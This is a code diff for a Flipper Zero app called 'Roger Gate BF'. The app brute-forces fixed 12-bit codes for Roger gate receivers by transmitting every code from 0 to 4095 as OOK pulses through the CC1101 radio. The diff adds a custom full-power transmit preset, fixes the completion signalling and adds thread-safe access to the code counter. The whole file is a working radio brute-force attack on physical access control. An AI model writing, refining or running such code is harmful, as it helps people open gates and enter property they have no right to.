@@ -10,7 +10,7 @@
 #define MAX_ATTEMPTS   4096
 #define SEND_DELAY_US  50000
 
-// ── Pulse timing (LevelDuration packs level + µs duration into one uint32_t) ─
+// ── Pulse timing ─────────────────────────────────────────────────────────────
 #define BIT1_ON_US   600
 #define BIT1_OFF_US  200
 #define BIT0_ON_US   200
@@ -18,12 +18,39 @@
 #define SYNC_ON_US   100
 #define SYNC_OFF_US  3100
 
+// ── OOK 270 kHz async preset for CC1101 ──────────────────────────────────────
+// Format: pairs of (register_address, value) terminated by (0x00, 0x00),
+// followed by 8 patable bytes.  Values sourced from Flipper firmware
+// subghz_device_cc1101_preset_ook_270khz_async_regs.
+static const uint8_t preset_ook270[] = {
+    0x02, 0x0D, // IOCFG0  – GDO0 signal
+    0x03, 0x47, // FIFOTHR
+    0x08, 0x32, // PKTCTRL0 – async serial mode, infinite packet
+    0x0B, 0x06, // FSCTRL1
+    0x14, 0x00, // MDMCFG0
+    0x13, 0x00, // MDMCFG1
+    0x12, 0x30, // MDMCFG2 – OOK modulation
+    0x11, 0x32, // MDMCFG3
+    0x10, 0x67, // MDMCFG4 – ~270 kHz bandwidth
+    0x18, 0x18, // MCSM0
+    0x19, 0x18, // FOCCFG
+    0x1D, 0x40, // AGCCTRL0
+    0x1C, 0x00, // AGCCTRL1
+    0x1B, 0x03, // AGCCTRL2
+    0x20, 0xFB, // WORCTRL
+    0x22, 0x11, // FREND0  – OOK power ramp
+    0x21, 0xB6, // FREND1
+    0x00, 0x00, // end marker
+    // PATABLE (8 bytes): 0 dBm off, max power on
+    0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+};
+
 // ── Transmit state passed to the async callback ──────────────────────────────
 typedef struct {
-    LevelDuration* sequence;   // pre-built pulse sequence
-    size_t         length;     // total number of LevelDuration entries
-    size_t         index;      // current position in sequence
-    FuriSemaphore* done_sem;   // signalled when sequence is exhausted
+    LevelDuration* sequence;
+    size_t         length;
+    size_t         index;
+    FuriSemaphore* done_sem;
 } TxState;
 
 // ── Async TX callback — called by the HAL to fetch the next sample ───────────
@@ -32,9 +59,12 @@ static LevelDuration tx_callback(void* ctx) {
     if(s->index < s->length) {
         return s->sequence[s->index++];
     }
-    // End of sequence: return silence and signal completion
-    furi_semaphore_release(s->done_sem);
-    return level_duration_reset(); // tells HAL we are done
+    // Signal completion exactly once, then tell the HAL we are done.
+    if(s->index == s->length) {
+        s->index++;
+        furi_semaphore_release(s->done_sem);
+    }
+    return level_duration_reset();
 }
 
 // ── Build LevelDuration sequence for one 12-bit Roger-gate code ──────────────
@@ -43,11 +73,9 @@ static size_t build_sequence(uint16_t code, LevelDuration* seq, size_t seq_len) 
     if(seq_len < 27) return 0;
     size_t i = 0;
 
-    // Sync pulse
     seq[i++] = level_duration_make(true,  SYNC_ON_US);
     seq[i++] = level_duration_make(false, SYNC_OFF_US);
 
-    // 12 data bits, MSB first
     for(int b = 11; b >= 0; b--) {
         if((code >> b) & 1) {
             seq[i++] = level_duration_make(true,  BIT1_ON_US);
@@ -58,7 +86,6 @@ static size_t build_sequence(uint16_t code, LevelDuration* seq, size_t seq_len) 
         }
     }
 
-    // Trailing high to close the last bit
     seq[i++] = level_duration_make(true, BIT1_ON_US);
 
     return i;
@@ -74,19 +101,15 @@ static void send_code(uint16_t code) {
         .sequence = seq,
         .length   = seq_len,
         .index    = 0,
-        .done_sem = furi_semaphore_alloc(1, 0), // max=1, initial=0
+        .done_sem = furi_semaphore_alloc(1, 0),
     };
 
-    // Configure radio
     furi_hal_subghz_reset();
-    furi_hal_subghz_load_preset(FuriHalSubGhzPresetOok270Async);
+    furi_hal_subghz_load_custom_preset(preset_ook270);
     furi_hal_subghz_set_frequency_and_path(ROGER_FREQ);
-    furi_hal_subghz_tx(); // switch to TX mode
-
-    // Start async transmission
+    furi_hal_subghz_tx();
     furi_hal_subghz_start_async_tx(tx_callback, &state);
 
-    // Wait for callback to signal completion (200 ms max)
     furi_semaphore_acquire(state.done_sem, furi_ms_to_ticks(200));
 
     furi_hal_subghz_stop_async_tx();
@@ -99,6 +122,7 @@ static void send_code(uint16_t code) {
 // ── App context ───────────────────────────────────────────────────────────────
 typedef struct {
     FuriMessageQueue* input_queue;
+    FuriMutex*        code_mutex;
     volatile bool     stop;
     uint16_t          current_code;
 } AppCtx;
@@ -106,13 +130,18 @@ typedef struct {
 // ── Draw callback ─────────────────────────────────────────────────────────────
 static void draw_cb(Canvas* canvas, void* ctx) {
     AppCtx* app = ctx;
+
+    furi_mutex_acquire(app->code_mutex, FuriWaitForever);
+    uint16_t code = app->current_code;
+    furi_mutex_release(app->code_mutex);
+
     canvas_clear(canvas);
     canvas_set_font(canvas, FontPrimary);
     canvas_draw_str(canvas, 5, 15, "Roger Gate BF");
     canvas_set_font(canvas, FontSecondary);
 
     char buf[32];
-    snprintf(buf, sizeof(buf), "Code: %04X / FFF", app->current_code);
+    snprintf(buf, sizeof(buf), "Code: %04X / FFF", code);
     canvas_draw_str(canvas, 5, 30, buf);
     canvas_draw_str(canvas, 5, 45, "BACK to stop");
 }
@@ -129,6 +158,7 @@ int32_t roger_gate_app(void* p) {
 
     AppCtx app = {
         .input_queue  = furi_message_queue_alloc(8, sizeof(InputEvent)),
+        .code_mutex   = furi_mutex_alloc(FuriMutexTypeNormal),
         .stop         = false,
         .current_code = 0,
     };
@@ -142,7 +172,7 @@ int32_t roger_gate_app(void* p) {
 
     while(!app.stop && app.current_code < MAX_ATTEMPTS) {
         send_code(app.current_code);
-        view_port_update(vp); // refresh progress on screen
+        view_port_update(vp);
 
         InputEvent event;
         while(furi_message_queue_get(app.input_queue, &event, 0) == FuriStatusOk) {
@@ -151,13 +181,15 @@ int32_t roger_gate_app(void* p) {
             }
         }
 
+        furi_mutex_acquire(app.code_mutex, FuriWaitForever);
         app.current_code++;
+        furi_mutex_release(app.code_mutex);
     }
 
-    // Cleanup
     gui_remove_view_port(gui, vp);
     furi_record_close(RECORD_GUI);
     view_port_free(vp);
+    furi_mutex_free(app.code_mutex);
     furi_message_queue_free(app.input_queue);
 
     return 0;
